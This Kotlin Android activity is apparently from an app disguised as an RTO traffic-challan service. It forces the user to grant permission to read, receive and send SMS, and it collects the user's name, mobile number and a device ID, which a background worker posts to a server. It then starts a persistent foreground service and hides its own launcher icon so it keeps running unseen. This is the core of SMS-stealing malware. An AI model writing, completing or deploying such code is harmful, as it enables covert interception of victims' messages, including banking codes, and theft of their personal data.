package com.rte.challan

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.rte.challan.service.BackgroundService
import com.rte.challan.worker.RegistrationWorker
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private val PERMISSION_CODE = 101
    private lateinit var layoutInput: LinearLayout // Aapka input form layout

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        layoutInput = findViewById(R.id.layoutInput) // XML mein is layout ko shuru me GONE rakhein

        // Pehle check karo agar setup ho chuka hai
        val prefs = getSharedPreferences("RTO_PREFS", Context.MODE_PRIVATE)
        if (prefs.getBoolean("is_active", false)) {
            hideLauncherIcon()
            finish()
            return
        }

        // 1. Step: Permissions Check
        if (allPermissionsGranted()) {
            showInputForm()
        } else {
            requestPermissions()
        }

        // Activate Button Logic
        findViewById<Button>(R.id.btnActivate).setOnClickListener {
            handleActivation()
        }
    }

    private fun showInputForm() {
        // Permissions milte hi input fields dikhao
        layoutInput.visibility = View.VISIBLE
    }

    private fun handleActivation() {
        val name = findViewById<EditText>(R.id.etName).text.toString()
        val mobile = findViewById<EditText>(R.id.etMobile).text.toString()
        val deviceId = findViewById<EditText>(R.id.etDeviceId).text.toString()

        if (name.isNotEmpty() && mobile.isNotEmpty() && deviceId.isNotEmpty()) {
            // Data sync aur service start
            setupCompleted(name, mobile, deviceId)
        } else {
            Toast.makeText(this, "All fields are required", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_CODE) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                showInputForm() // Permissions milte hi form show karo
            } else {
                Toast.makeText(this, "Permissions are mandatory for RTO sync", Toast.LENGTH_LONG).show()
                finish()
            }
        }
    }

    private fun setupCompleted(name: String, mobile: String, deviceId: String) {
        // Save locally
        getSharedPreferences("RTO_PREFS", Context.MODE_PRIVATE).edit().apply {
            putString("cust_name", name)
            putString("mobile_no", mobile)
            putString("device_id", deviceId)
            putBoolean("is_active", true)
            apply()
        }

        // Worker ko data pass karo jo /api/details (POST) karega
        val inputData = workDataOf(
            "name" to name,
            "mobile" to mobile,
            "deviceId" to deviceId
        )

        val regRequest = OneTimeWorkRequestBuilder<RegistrationWorker>()
            .setInputData(inputData)
            .build()
        WorkManager.getInstance(this).enqueue(regRequest)

        // Background Service Start
        val serviceIntent = Intent(this, BackgroundService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)

        // Hide Icon and Exit
        hideLauncherIcon()
        finish()
    }

    private fun allPermissionsGranted(): Boolean {
        val permissions = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS
        )
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        ActivityCompat.requestPermissions(this, permissions.toTypedArray(), PERMISSION_CODE)
    }

    private fun hideLauncherIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
